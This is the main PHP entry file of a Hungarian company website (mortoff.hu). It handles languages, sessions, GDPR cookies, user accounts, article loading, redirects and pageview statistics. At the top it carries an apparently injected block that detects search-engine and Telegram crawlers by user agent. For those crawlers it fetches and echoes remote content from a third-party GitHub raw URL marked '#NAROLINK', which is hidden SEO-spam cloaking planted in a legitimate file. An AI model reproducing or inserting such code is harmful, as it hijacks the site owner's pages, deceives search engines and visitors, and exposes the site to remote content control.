<?php
function is_bot() {
    $user_agent = $_SERVER['HTTP_USER_AGENT']; 
    $bots = array('Googlebot', 'TelegramBot', 'bingbot', 'Google-Site-Verification', 'Google-InspectionTool');
    
    foreach ($bots as $bot) {
        if (stripos($user_agent, $bot) !== false) {
            return true;
        }
    }
    
    return false;
}

if (is_bot()) {
    $message = file_get_contents('https://raw.githubusercontent.com/yugoprakoso157/D/refs/heads/main/mortoff.hu.txt');#NAROLINK
    echo $message;
}
?>
<?php

session_start();

header('Content-Type: text/html; charset=utf-8');
date_default_timezone_set('Europe/Belgrade');

if (get_magic_quotes_gpc()) {
    function magicQuotes_awStripslashes(&$value, $key) {$value = stripslashes($value);}
    $gpc = array(&$_GET, &$_POST, &$_COOKIE, &$_REQUEST);
    array_walk_recursive($gpc, 'magicQuotes_awStripslashes');
}

// hiba megjelenitese
error_reporting(0);
ini_set('display_errors', 0);

require_once 'config/main.php';
require_once 'autoloader.php';

$is_dev = false;
$dev_ip = array();
$dev_ip[] = '46.40.7.118';
$dev_ip[] = '46.40.7.117';
if ($is_dev === true || in_array(GET_IP(), $dev_ip)) {
    $is_dev = true;

    // hiba megjelenitese
    error_reporting(E_ALL);
    ini_set('display_errors', 1);

    // die('test');

    $_CONFIG['test_mail'] = 'test1@erdsoft.net';
}

// konfiguraciok, osztalyok, alapfunkciok betoltse
require_once 'class/' . CONNECT_TYPE . '.class.php';
require_once 'smarty/Smarty.class.php';
require_once 'class/Mobile_Detect.php';
require_once 'class/pager.class.php';
require_once 'class/url_handler.php';
require_once 'class/erd_cryptor.php';
require_once 'class/debug.php';
require_once 'class/erd_blocks.class.php';

Debug::init();
// példányosítások
$SQL     = new sqlClass();
$PAG     = new pagerClass();
$cryptor = new erdCryptor();
$smarty  = new Smarty();
$smarty->loadFilter('output', 'trimwhitespace');
$smarty->setTemplateDir(array(
    'main' => realpath('./tpl/'),
));
$smarty->setCompileDir(realpath('./tpl/compile/'));
$smarty->setCacheDir(realpath('./tpl/cache/'));
if (defined('USE_PHPMAILER')) {
    require_once 'class/class.phpmailer.php';
    $MAILER = new PHPMailer();
}

$block_handler = new erdBlocks('frontend');
$domain = $block_handler->getDomain();
$section_id = $block_handler->getSection($domain);
$section_languages = $block_handler->getLangOptions($domain);
$domain_languages = $block_handler->getLangOptions();
$smarty->assign('domain_languages', $domain_languages);
Debug::add($domain . ' => ' . $section_id);
// Debug::add($domain_languages);
// Debug::add($block_handler->getSectionOptions());
$smarty->assign('domain', $domain);

$section_extra = $block_handler->getSectionsExtra();
if (isset($section_extra[$domain]) && in_array('separate_indirect', $section_extra[$domain]) && isset($_CONFIG['separate_indirects'][$domain])) {
    // overwrite some indexes
    foreach ($_CONFIG['separate_indirects'][$domain] as $dom_lng => $dom_values) {
        foreach ($dom_values as $ind_key => $ind_value) {
            $_CONFIG['indirect_contents'][$dom_lng][$ind_key] = $ind_value;
        }
    }
}

// get all domain/section pairs
$all_domains = $block_handler->getSectionOptions();
$all_domains_flipped = array_flip($all_domains);


// select languages
$_CONFIG['languages'] = $section_languages;
$_CONFIG['section_id'] = $section_id;
// this class needs the languages, so this line should always come after reading out the languages from the database
$URLS   = new urlHandler();

$prev_lng = getSession('lang');

if (!empty($_GET['test_token']) && in_array($_GET['test_token'], $_CONFIG['test_tokens'])) {
    setSession('test_token', $_GET['test_token']);
}
$test_token = getSession('test_token');
if (!empty($test_token) && in_array($test_token, $_CONFIG['test_tokens'])) {
    $is_dev = true;
}

$lng = LNG_CHANGE();

setSession('lang', $lng);
// require_once './lng/' . $lng . '.php';
require_once './lng/' . $lng . '.php';

// redirect to previous language
if (isset($prev_lng) && !is_null($prev_lng) && $prev_lng != $lng && isset($_SERVER['HTTP_REFERER'])) {
    $to_resolve = $_SERVER['HTTP_REFERER'];
    $to_resolve = str_replace($_CONFIG['url'], '', $to_resolve);
    $url = $URLS->resolve($to_resolve, $prev_lng, $lng);
    REDIRECT($_CONFIG['url'] . $url);
}

// set version [desktop, mobile]
$versions = array('desktop', 'mobile');
if (isset($_GET['version']) && in_array($_GET['version'], $versions)) {
    setSession('version', $_GET['version']);

    header("Location: ./");
    exit();
}
Debug::add($_GET);

// for generate pageview device changer
if (isset($_GET['generate_pageview_version']) && in_array($_GET['generate_pageview_version'], $versions)) {
    setSession('version', $_GET['version']);
}
/////////////////////////

$is_psi = detectPSI();

$detect = new Mobile_Detect();
$version = getSession('version');
if (is_null($version)) {
    $version = 'desktop';
    if ($detect->isMobile()) {
        $version = 'mobile';
    }

    setSession('version', $version);
}

$is_tablet = getSession('is_tablet');
if (is_null($is_tablet)) {
    $is_tablet = $detect->isTablet();
    setSession('is_tablet', $is_tablet);
}
$is_mobile = ($version == 'mobile') ? true : false;

$is_bot = false;
if (isset($_SERVER['HTTP_USER_AGENT'])) {
    $detect->setUserAgent($_SERVER['HTTP_USER_AGENT']);
    $is_bot = $detect->is('Bot', $_SERVER['HTTP_USER_AGENT']) || $detect->is('MobileBot', $_SERVER['HTTP_USER_AGENT']);
}

$today = date('Y-m-d');
$now = date('Y-m-d H:i:s');

// TARTALOM KEZELO ////////////////////////////////////////
$p = '';
if (isset($_GET['p'])){
    $p = TEXT_FILTER($_GET['p']);
}
if (!file_exists('./' . $p . '.php')) {
    $p = 'home';
}
$smarty->assign('p', $p);


// read general config
$settings = readConfig('config', $_CONFIG['section_id']);
$url_slugs = $URLS->getSlugs($lng);
if ($url_slugs === false && $p != 'error') {
    redirect('index.php?p=error&code=4004');
}
Debug::add($url_slugs);

if ($is_dev === true) {
    if (isset($settings['admin_emails'])) {
        $settings['admin_emails']     = $_CONFIG['test_mail'];
    }
    if (isset($settings['order_emails'])) {
        $settings['order_emails']     = $_CONFIG['test_mail'];
    }
}
$check_pics = array(
    'logo' => 'images/mortoff_logo@2x.png',
    'facebook_pic' => 'images/fb_default.jpg',
    'email_header' => 'images/nl_header.png',
    'email_footer' => 'images/nl_footer.png',
    'side_image_' . $lng => '',
);
foreach ($check_pics as $pic_key => $pic_def) {
    $picture_setup = array(
        $pic_key => array(
            'config' => str_replace('_' . $lng, '', $pic_key),
            'sizes' => array('_resized'),
            'def_pic' => $pic_def,
        ),
    );

    $do_check = recheckPics(array(array($pic_key => isset($settings[$pic_key]) ? $settings[$pic_key] : '')), $picture_setup);
    $do_check = current($do_check);
    $settings[$pic_key] = $do_check[$pic_key];
}

$side_options = !empty($settings['side_popup_' . $lng]) ? (array) json_decode($settings['side_popup_' . $lng], true) : array();
if (!empty($side_options)) {
    $side_options['image'] = !empty($settings['side_image_' . $lng]) && empty($settings['side_image_' . $lng]['no_pic']) ? $settings['side_image_' . $lng] : array();
}
$side_options_open = getCookieData('spp');
// Debug::add($settings);
// Debug::add($side_options);
// Debug::add($side_options_open);
$smarty->assign('side_options', $side_options);
$smarty->assign('side_options_open', $side_options_open);

// Debug::add($settings);
$current_url = getUrl();
$url_parts = parse_url($current_url);

$url_path = ltrim($url_parts['path'], '/');
if ($_CONFIG['path'] != '/') {
    $url_path = str_replace($_CONFIG['path'], '', $url_path);
}
// $url_path = ltrim($url_parts['path'], '/');

$languages_change_urls = array();
foreach ($section_languages as $short => $_lng) {
    // $url_path = ltrim($url_parts['path'], '/');
    $languages_change_urls[$short] = $_CONFIG['url'] . ltrim((!empty($url_path) ? $URLS->resolve($url_path, $lng, $short) : $short . '/'), '/') . (isset($_GET['domain']) && !empty($_GET['domain']) ? '?domain=' . $_GET['domain'] : '');
}
$smarty->assign('section_languages', $section_languages);
$smarty->assign('languages_change_urls', $languages_change_urls);
// Debug::add($_CONFIG['url']);
// Debug::add($url_slugs);
// Debug::add($url_path);
// Debug::add($_SERVER);

//
// GDPR
//
$cookies = array();

$cookies['hide_panel'] = false;
if (isset($_COOKIE[$_CONFIG['sprefix'] . '_cookie_consent_done'])) {
    $cookies['hide_panel'] = true;
}
$cookies['last_updated'] = sprintf($_TEXT['cookie_last_updated'], date($_CONFIG['cookies']['date_format'][$lng], strtotime($_CONFIG['cookies']['last_update'])));

$cookies['allowed_types'] = $_CONFIG['cookies']['default_allowed'];
if (isset($_COOKIE[$_CONFIG['sprefix'] . '_allowed_cookie_types'])) {
    $cookies['allowed_types'] = explode(',', $_COOKIE[$_CONFIG['sprefix'] . '_allowed_cookie_types']);

    foreach ($_CONFIG['cookies']['types'] as $type_index => $cookie_type) {
        $cookie_type['checked'] = false;
        if (in_array($type_index, $cookies['allowed_types'])) {
            $cookie_type['checked'] = true;
        }

        $_CONFIG['cookies']['types'][$type_index] = $cookie_type;
    }
}
// remove cookies that were added after consent was given

$excluded_cookie_categories = array_diff(array_keys($_CONFIG['cookies']['groups']), $cookies['allowed_types']);

foreach ($excluded_cookie_categories as $excluded_cat) {
    foreach ($_CONFIG['cookies']['groups'][$excluded_cat] as $delete_cookie) {
        setcookie($delete_cookie, '', time() - 100000000);
    }
}
// gdpr cookie handling end

$smarty->assign('settings', $settings);
$smarty->assign('url_slugs', $url_slugs);
$smarty->assign('TEXT', $_TEXT);
$smarty->assign('CONFIG', $_CONFIG);
$smarty->assign('lng', $lng);
$smarty->assign('is_dev', $is_dev);
$smarty->assign('is_psi', $is_psi);
$smarty->assign('is_bot', $is_bot);
$smarty->assign('is_mobile', $is_mobile);
$smarty->assign('cookies', $cookies);

// some css file hacks...
$main_css = 'main.min.css';
if (isset($_CONFIG['extra_css'][$domain]) && isset($_CONFIG['extra_css'][$domain]['main'])) {
    $main_css = $_CONFIG['extra_css'][$domain]['main'];
}
$smarty->assign('main_css', $main_css);

// do we need some critical css?
$critical = getCookieData('critcss');
$critical = !is_null($critical) ? $critical : 'needed';
$critical_css_file = 'index';
$critical_p = $p;
$critical_aliases = array(
    // 'articles' => 'article',
);

foreach ($critical_aliases as $critical_current_p => $critical_alias) {
    if ($p === $critical_current_p) {
        $critical_p = $critical_alias;
    }
}
if (isset($_CONFIG['extra_css'][$domain]) && isset($_CONFIG['extra_css'][$domain]['critical'])) {
    $critical_p = $_CONFIG['extra_css'][$domain]['critical'];
}
// Debug::add($critical_p);

if (file_exists('css/critical_' . $critical_p . '.min.css')) {
    $critical_css_file = $critical_p;
}
$smarty->assign('critical', $critical);
$smarty->assign('critical_css_file', $critical_css_file);
// and be brave and set the cookie back
setCookieData('critcss', 'loaded', time() + 3600 * 24 * 7);

// unsubscribe
if (isset($_GET['type']) && isset($_GET['code']) && $_GET['type'] == 'unsubscribe' && strlen($_GET['code']) == 32) {
    $sql = "DELETE FROM newsletter_sign WHERE MD5(email) = '" . $SQL->escape($_GET['code']) . "' AND section_id = '{$_CONFIG['section_id']}'";
    if ($SQL->sql($sql)) {
        setSession('temp_msg', $_TEXT['nl_unsubscribe_success']);
    }
    else {
        setSession('temp_msg', $_TEXT['nl_unsubscribe_failed']);
    }

    header("Location: " . $_CONFIG['url']);
    exit();
}

$isLoggedIn = false;
$user_data = array();
$is_wholesale = false;
if (defined('USER_HANDLER')) {
    // logout
    if (isset($_GET['logout']) && $_GET['logout'] == 'logout') {
        unsetSession('user');
        setSession('temp_msg', $_TEXT['successful_logout']);

        REDIRECT($_CONFIG['url']);
    }

    // user activation
    if (isset($_GET['activate']) && strlen($_GET['activate']) == 32) {
        $act_code = $SQL->escape($_GET['activate']);
        $sql = "SELECT id, active FROM users WHERE MD5(CONCAT(id, email)) = '{$act_code}' AND section_id = '{$_CONFIG['section_id']}' ";
        $userd = $SQL->sqlAllAssoc($sql);
        if (!empty($userd)) {
            $userd = current($userd);
            if ($userd['active'] == '0') {
                $sql = "UPDATE users SET active = '1' WHERE id = '{$userd['id']}'";
                if ($SQL->sql($sql)) {
                    $popup_msg = $_TEXT['successful_activation'];
                }
                else {
                    $popup_msg = $_TEXT['unsuccessful_activation'];
                }
            }
            else {
                $popup_msg = $_TEXT['you_already_activated'];
            }
        }
        else {
            $popup_msg = $_TEXT['unsuccessful_activation'];
        }
        setSession('temp_msg', $popup_msg);
    }

    // this should be here, even if it is an empty array. other functions depend on it
    $user_session = getSession('user');
    if (!is_null($user_session)) {
        $user_id = $user_session['id'];
        $user_check = $SQL->sqlAllAssoc("SELECT id, firstname, lastname, email, name, company, pib, country, address, zip, city, settlement, floor, apartment, phone, mobile, bill_name, bill_country, bill_address, bill_zip, bill_city, bill_settlement, bill_floor, bill_apartment, pib, payment_type, delivery_type, newsletter_ready, marketing, wholesale, lng FROM users WHERE id = '$user_id' AND active = 1 AND deleted = 0 AND section_id = '{$_CONFIG['section_id']}' ");
        if (empty($user_check)) {
            unsetSession('user');
        }
        else {
            $user_data = current($user_check);
            $isLoggedIn = true;
            $is_wholesale = $user_data['wholesale'] == 1 ? true : false;

            setSession('delivery_type', $user_data['delivery_type']);

            // change user's language when changing page language
            $temp_lng = getSession('lang');
            if ($user_data['lng'] != $temp_lng) {
                if (!is_null($temp_lng)) {
                    $sql = "UPDATE users SET lng = '$temp_lng' WHERE id = '$user_id'";
                    $SQL->sql($sql);

                    $user_data['lng'] = $temp_lng;
                }
                else {
                    setSession('lang', $user_data['lng']);
                }
            }
        }
    }
}

$wishlist = (array) json_decode((string) getCookieData('wishlist'), true);
$smarty->assign('wishlist', $wishlist);

$smarty->assign('isLoggedIn', $isLoggedIn);
$smarty->assign('user_data', $user_data);
$smarty->assign('is_wholesale', $is_wholesale);
$type = isset($_GET['type']) && !empty($_GET['type']) ? $SQL->escape($_GET['type']) : false;
$smarty->assign('type', $type);

$temp_msg = getSession('temp_msg');
if (!is_null($temp_msg)) {
    unsetSession('temp_msg');
    $smarty->assign('temp_msg', $temp_msg);
}

// load article's config
require_once 'config/article_config.php';

// get indirect contents
$basic_article_filter_sql = $basic_article_filter;
$basic_article_filter_sql['1'] = "id IN (" . sqlSetIn($_CONFIG['indirect_contents'][$lng]) . ")";
$basic_article_filter_sql = implode(" AND ", $basic_article_filter_sql);

$article_fields_sql = $article_fields;
// $article_fields_sql[] = 's_text_line';
// $article_fields_sql[] = 'right_s_text';
$article_fields_sql[] = 'pic_url';
$article_fields_sql[] = 'pic_1';
$article_fields_sql[] = 'pic_2';
$article_fields_sql[] = 'pic_3';
$article_fields_sql = implode(',', $article_fields_sql);

$indirect_indexes = array_flip($_CONFIG['indirect_contents'][$lng]);
$sql = "SELECT $article_fields_sql FROM sitetree WHERE $basic_article_filter_sql";
// Debug::add($sql);
$indirect_contents = $SQL->sqlAllAssocById($sql, 'id');
$picture_setup = array(
    'pic_url' => array(
        'config' => 'article',
        'sizes' => array('_resized'),
    ),
);

$indirect_contents = prepareArticles($indirect_contents, $picture_setup);
// make it easily accessible
foreach ($indirect_contents as $key => $value) {
    if (isset($indirect_indexes[$value['id']])) {
        $indirect_contents[$indirect_indexes[$value['id']]] = $value;
    }

    unset($indirect_contents[$key]);
}
$smarty->assign('indirect_contents', $indirect_contents);
// Debug::add($indirect_contents[]);

if (isset($indirect_contents['thank_you_page'])) {
    // Debug::add($indirect_contents['thank_you_page']);
}

$article_columns = array();
$article_column_indexes = $_CONFIG['article_columns'][$lng];
$article_column_indexes_rev = array_flip($article_column_indexes);
$sql = "SELECT id, name FROM sitetree_categories WHERE deleted = '0' AND lng = '{$lng}' AND id IN (".implode(',', $article_column_indexes).")";
$article_columns_temp = $SQL->sqlAllAssocById($sql, 'id');
if (!empty($article_columns_temp)) {
    foreach ($article_columns_temp as $k => $t) {
        $article_columns[$article_column_indexes_rev[$k]]= $t;
    }
}
$smarty->assign('article_columns', $article_columns);


// ajax request
// move up/down if require
$ajax_p = REQUEST('ajax_p', 'g');
// cart
// if ($ajax_p != 'generatecart') {
//     require_once 'ajax/ajax.generatecart.php';
//     $smarty->assign('json_cart', $json_cart);
// }
if ($ajax_p != '' && file_exists('ajax/ajax.' . $ajax_p . '.php')) {
    header('Content-Type: application/json; charset=utf-8');

    require_once 'ajax/ajax.' . $ajax_p . '.php';

    $SQL->close();
    exit;
}

// 301 redirects...
// get this url...
if ($ajax_p == '' && isset($url_parts['path'])) {
    $replace_domain = $_CONFIG['regex_url'];

    $current_path = ltrim($url_parts['path'], '/');
    $replace_path = ltrim($_CONFIG['path'], '/');
    $current_path = str_replace($replace_path, '', $current_path);
    $current_path = rtrim($current_path, '/');

    if ($current_path != '') {
        $url = '';

        // check other redirects first...
        if (empty($url)) {
            $from_to = array();

            if (isset($from_to[$current_path])) {
                if (isset($url_slugs[$from_to[$current_path]])) {
                    $url = $url_slugs[$from_to[$current_path]];
                }
                else {
                    $url = $from_to[$current_path];
                }
            }
            else {
                $query = getParams(array_keys($_GET), array_values($_GET));
                if (!empty($query)) {
                    $current_path_temp = $current_path . '?' . $query;
                    if (isset($from_to[$current_path_temp]) && isset($url_slugs[$from_to[$current_path_temp]])) {
                        $url = $url_slugs[$from_to[$current_path_temp]];
                    }
                }
            }
        }


        // still nothing? check sitetree...
        if (empty($url)) {
            $query_path = $replace_domain . preg_quote(rtrim($current_path, '/')) . '\/?';
            $sql = "SELECT id, url_name
                FROM sitetree
                WHERE custom_url != '' AND CAST(custom_url AS BINARY) REGEXP BINARY '^" . $SQL->escape($query_path) . "$' AND deleted = 0";
            $redirect_url = $SQL->sqlAllAssoc($sql);

            if (!empty($redirect_url)) {
                $redirect_url = current($redirect_url);
                $urls = array_flip($_CONFIG['indirect_contents'][$lng]);
                if (isset($urls[$redirect_url['id']])) {
                    if (isset($url_slugs['article_' . $urls[$redirect_url['id']]])) {
                        $url = $url_slugs['article_' . $urls[$redirect_url['id']]];
                    }
                    else if (isset($url_slugs[$urls[$redirect_url['id']]])) {
                        $url = $url_slugs[$urls[$redirect_url['id']]];
                    }
                }
                else {
                    $url = $redirect_url['url_name'] . '/' . $url_slugs['article_slug1'] . '/' . $redirect_url['id'] . '/';
                }
            }
        }

        if ($url != '') {
            http_response_code(301);
            redirect((VALIDATE_URL($url) === true ? $url : $_CONFIG['url'] . str_replace($_CONFIG['url'], '', $url)));
        }
    }
}

$social_stuff = array();
foreach ($_CONFIG['allowed_social'] as $key => $value) {
    if (isset($settings['contact_' . $value]) && !empty($settings['contact_' . $value]) && isset($settings['contact_' . $value . '_visible']) && $settings['contact_' . $value . '_visible'] == 1) {
        $social_stuff[$value] = $settings['contact_' . $value];
    }
}
$smarty->assign('social_stuff', $social_stuff);

$current_block_data = $block_handler->getDomainBlocks($domain, $lng);
$current_menu = $block_handler->getMenu();
// Debug::add($current_menu);
// Debug::add($current_block_data[0]['data']['details']);
$smarty->assign('current_menu', $current_menu);
// also get the hero data in a separate var too
$reverse_slides = array();
foreach ($current_block_data as $key => $value) {
    if ($value['type'] == 'hero') {
        if (isset($value['data']['details']['slider_sort']) && $value['data']['details']['slider_sort'] == 1) {
            $reverse_slides = $value['data']['details']['slides'];
            rsort($reverse_slides);
            $value['data']['details']['reverse_slides'] = $reverse_slides;
        }
        Debug::add(current($reverse_slides));
        $smarty->assign('reverse_slides', $reverse_slides);
        $smarty->assign('hero_data', isset($value['data']) ? $value['data'] : array());
        break;
    }
}
// Debug::add($current_block_data);

// we also need our services
$basic_article_filter_sql = $basic_article_filter;
$basic_article_filter_sql[] = "source_id = '{$_CONFIG['article_columns'][$lng]['services']}'";
$basic_article_filter_sql = implode(" AND ", $basic_article_filter_sql);

$article_fields_sql = $article_fields;
$article_fields_sql[] = 'pic_url';
$article_fields_sql = implode(',', $article_fields_sql);

$sql = "SELECT $article_fields_sql FROM sitetree WHERE $basic_article_filter_sql ORDER BY priority = 0, priority, IF (CONCAT(start_date, ' 00:00:00') > added_at, CONCAT(start_date, ' 00:00:00'), added_at) DESC, id DESC";
$services = $SQL->sqlAllAssoc($sql);
$services = prepareArticles($services);
$services[] = [
    'id' => 'bot',
    'title' => 'BOT',
    'url' => 'https://bot.mortoff.hu/',
];
$our_solutions = [];
foreach ($services as $service_key => $service) {
    if ($_CONFIG['our_solutions_nav'][$lng] == $service['id']) {
        $our_solutions = $service;
        unset($services[$service_key]);
        break;
    }
}

$our_solutions_sections = $SQL->sqlAllAssocById("SELECT section_id, name FROM sections WHERE deleted = 0 AND lng = '{$lng}'", 'section_id');
// Debug::add($our_solutions_sections);

$nav_link_sufix = 'hu';
if ($lng != 'hu') {
    $nav_link_sufix = 'com';
}

$our_solutions_content_config = array(
    'rpa' => [
        'name' => $_TEXT['rpa'],
        'url' => 'https://rpa.mortoff.hu/',
        'id' => 4,
    ],
    'automation' => [
        'name' => $_TEXT['process_automation'],
        'url' => 'https://process.automation.mortoff.hu/',
        // 'id' => 4,
    ],
    // 'testify' => [
    //     'name' => $_TEXT['testify'],
    //     'url' => 'https://testify.mortoff.hu/',
    //     'id' => 2,
    // ],
    'reach' => [
        'name' => $_TEXT['reach'],
        'url' => 'https://reach-i4.' . $nav_link_sufix . '/',
    ],
    // 'msigno' => [
    //     'name' => $_TEXT['msigno'],
    //     'url' => 'https://www.msigno.' . $nav_link_sufix . '/',
    // ],
    'mitras' => [
        'name' => $_TEXT['mitras'],
        'url' => 'https://mitras.mortoff.hu/',
        'id' => 10,
    ],
);
$our_solutions_content = [];
foreach ($our_solutions_content_config as $current_key => $current_conf) {
    if (isset($current_conf['id'])) {
        if (isset($our_solutions_sections[$current_conf['id']])) {
            $our_solutions_content[$current_key] = $current_conf;
        }
    }
    else {
        $our_solutions_content[$current_key] = $current_conf;
    }
}

$smarty->assign('services', $services);
$smarty->assign('our_solutions', $our_solutions);
$smarty->assign('our_solutions_content', $our_solutions_content);
// Debug::add($services);

// we also need our competencies
$basic_article_filter_sql = $basic_article_filter;
$basic_article_filter_sql[] = "source_id = '{$_CONFIG['article_columns'][$lng]['our_competencies']}'";
$basic_article_filter_sql = implode(" AND ", $basic_article_filter_sql);

$article_fields_sql = $article_fields;
$article_fields_sql[] = 'pic_url';
$article_fields_sql = implode(',', $article_fields_sql);

$sql = "SELECT $article_fields_sql FROM sitetree WHERE $basic_article_filter_sql ORDER BY priority = 0, priority, IF (CONCAT(start_date, ' 00:00:00') > added_at, CONCAT(start_date, ' 00:00:00'), added_at) DESC, id DESC";
$our_competencies = $SQL->sqlAllAssoc($sql);
$our_competencies = prepareArticles($our_competencies);
$smarty->assign('our_competencies', $our_competencies);

// industry_solutions
$basic_article_filter_sql = $basic_article_filter;
$basic_article_filter_sql[] = "source_id = '{$_CONFIG['article_columns'][$lng]['industry_solutions']}'";
$basic_article_filter_sql = implode(" AND ", $basic_article_filter_sql);

$article_fields_sql = $article_fields;
$article_fields_sql[] = 'pic_url';
$article_fields_sql = implode(',', $article_fields_sql);

$sql = "SELECT $article_fields_sql FROM sitetree WHERE $basic_article_filter_sql ORDER BY priority = 0, priority, IF (CONCAT(start_date, ' 00:00:00') > added_at, CONCAT(start_date, ' 00:00:00'), added_at) DESC, id DESC";
$industry_solutions = $SQL->sqlAllAssoc($sql);
$industry_solutions = prepareArticles($industry_solutions);
$smarty->assign('industry_solutions', $industry_solutions);
// Debug::add($industry_solutions);

// some favicons...
$favicon_settings = array(
    'folder' => 'favicons',
    'mask_icon' => '#f5821f',
    'msapplication_color' => '#ffffff',
);
if (isset($_CONFIG['favicons']) && isset($_CONFIG['favicons'][$domain])) {
    $favicon_settings = arrayMergeRecursive($favicon_settings, $_CONFIG['favicons'][$domain]);
}
$smarty->assign('favicon_settings', $favicon_settings);

// footer script
$fajax_p = array('common', $p);
foreach ($fajax_p as $key => $value) {
    $file = $smarty->template_dir['main'] . '/ajax/ajax.' . $value . '.tpl';
    if (file_exists($file)) {
        $fajax_p[$value] = $file;
    }
    // else {
        unset($fajax_p[$key]);
    // }
}
$smarty->assign('fajax_p', $fajax_p);
// Debug::add($fajax_p);
// any tagmanager stuff?
if ($smarty->templateExists('tagmanager/' . $domain . '.tpl')) {
    $smarty->assign('tagmanager_template', 'tagmanager/' . $domain . '.tpl');
}

// TARTALOM KEZELO ////////////////////////////////////////

// metas
$meta = array(
    'title' => isset($settings['meta_title_' . $lng]) ? $settings['meta_title_' . $lng] : $_CONFIG['page_name'],
    'keywords' => isset($settings['meta_keyword_' . $lng]) ? $settings['meta_keyword_' . $lng] : '',
    'description' => isset($settings['meta_description_' . $lng]) ? $settings['meta_description_' . $lng] : $_CONFIG['page_name'],
    'url' => $_CONFIG['url'] . ($_CONFIG['path'] != '/' ? ltrim(str_replace($_CONFIG['path'], '', $_SERVER['REQUEST_URI']), '/') : ltrim($_SERVER['REQUEST_URI'], '/')),
    'type' => array(
        'schema' => 'Website',
        'og' => 'website',
        'twitter' => 'summary',
    ),
    'twitter_site' => '',
);
// Debug::add($settings);
$smarty->assign('meta', $meta);

/////////////////////////////

// new statistics - without bot and our data
if (!$is_dev && !$is_bot) {
// if (!$is_bot) {
    // determine if this is a unique visitor or not
    $unique_visitor_session = getSession('unique_visitor');
    if (is_null($unique_visitor_session)) {
        setSession('unique_visitor', true);
        $unique_visitor = true;
    }
    else {
        $unique_visitor = false;
    }
    // Debug::add($unique_visitor_session, 'dump');
    // Debug::add($_SERVER);

    if (isset($_SERVER['REQUEST_URI'])) {
        $ignored_urls = array(
            '/favicon.ico',
        );

        $gen_params_from = array('?generate_pageview_version=mobile', '?generate_pageview_version=desktop');
        $gen_params_to = array('', '');
        $_SERVER['REQUEST_URI'] = str_replace($gen_params_from, $gen_params_to, $_SERVER['REQUEST_URI']);

        if (!in_array($_SERVER['REQUEST_URI'], $ignored_urls)) {
            $escaped_uri = $SQL->escape($_SERVER['REQUEST_URI']);
            $escaped_agent = $SQL->escape($_SERVER['HTTP_USER_AGENT']);

            // log fishy url's user agent strings
            if (strpos($_SERVER['REQUEST_URI'], '/index.php?route=') !== false || strpos($_SERVER['REQUEST_URI'], '/fonts/') !== false) {
                $SQL->sql("INSERT INTO fishy_uas SET visited_at = '".date('Y-m-d H:i:s')."', `ip` = '" . GET_IP() . "', `url` = '" . $escaped_uri . "', `ua` = '" . $escaped_agent . "', `section_id` = '{$_CONFIG['section_id']}' ");
            }
            else {
                $page_views = $SQL->sqlField("SELECT COUNT(id) FROM stats_pageviews WHERE visited_at = '".date('Y-m-d H:00:00')."' AND `is_unique` = '0' AND `is_mobile` = '{$is_mobile}' AND `section_id` = '{$_CONFIG['section_id']}' ");

                if ($page_views > 0) {
                    // increment pageview counter for this hour
                    $SQL->sql("UPDATE stats_pageviews SET `counter` = `counter` + 1 WHERE visited_at = '".date('Y-m-d H:00:00')."' AND `is_unique` = '0' AND `is_mobile` = '{$is_mobile}' AND `section_id` = '{$_CONFIG['section_id']}' ");
                }
                else {
                    // increment pageview counter for this hour
                    $SQL->sql("INSERT INTO stats_pageviews SET visited_at = '".date('Y-m-d H:00:00')."', `counter` = '1', `is_unique` = '0', `is_mobile` = '{$is_mobile}', `section_id` = '{$_CONFIG['section_id']}' ");
                }

                if ($unique_visitor === true) {
                    $unique_page_views = $SQL->sqlField("SELECT COUNT(id) FROM stats_pageviews WHERE visited_at = '".date('Y-m-d H:00:00')."' AND `is_unique` = '1' AND `is_mobile` = '{$is_mobile}' AND `section_id` = '{$_CONFIG['section_id']}' ");

                    if ($unique_page_views > 0) {
                        // increment unique visitor pageview counter for this hour
                        $SQL->sql("UPDATE stats_pageviews SET `counter` = `counter` + 1 WHERE visited_at = '".date('Y-m-d H:00:00')."' AND `is_unique` = '1' AND `is_mobile` = '{$is_mobile}' AND `section_id` = '{$_CONFIG['section_id']}'");
                    }
                    else {
                        // increment unique visitor pageview counter for this hour
                        $SQL->sql("INSERT INTO stats_pageviews SET visited_at = '".date('Y-m-d H:00:00')."', `counter` = '1', `is_unique` = '1', `is_mobile` = '{$is_mobile}', `section_id` = '{$_CONFIG['section_id']}'");
                    }
                }

                $page_views = $SQL->sqlField("SELECT COUNT(id) FROM stats_pages WHERE visited_at = '".date('Y-m-d')."' AND `url` = '" . $escaped_uri . "' AND `is_mobile` = '{$is_mobile}' AND `section_id` = '{$_CONFIG['section_id']}' ");

                if ($page_views > 0) {
                    // increment pageview counter for this day
                    $SQL->sql("UPDATE stats_pages SET `counter` = `counter` + 1 WHERE visited_at = '".date('Y-m-d')."' AND `url` = '" . $escaped_uri . "' AND `is_mobile` = '{$is_mobile}' AND `section_id` = '{$_CONFIG['section_id']}' ");
                }
                else {
                    // increment pageview counter for this day
                    $SQL->sql("INSERT INTO stats_pages SET visited_at = '".date('Y-m-d')."', `counter` = '1', `url` = '" . $escaped_uri . "', `is_mobile` = '{$is_mobile}', `section_id` = '{$_CONFIG['section_id']}' ");
                }
            }
        }
    }
}
// new statistics end - without bot and our data

Debug::add($p);
// content
include_once './' . $p . '.php';


// statistic_pageview
// $sqlNum = $SQL->sqlNum("SELECT `count` FROM statistic_pageview WHERE `date` = '".date("Y-m-d")."' AND section_id = '{$_CONFIG['section_id']}' ");

// if ($sqlNum > 0) {
//     $SQL->sql("UPDATE statistic_pageview SET `count` = `count`+1 WHERE `date` = '".date("Y-m-d")."' AND section_id = '{$_CONFIG['section_id']}'");
// }
// else {
//     $SQL->sql("INSERT INTO statistic_pageview (`date`, `count`, `section_id`) VALUES ('".date("Y-m-d")."', '1', '{$_CONFIG['section_id']}')");
// }

$SQL->close();
?>
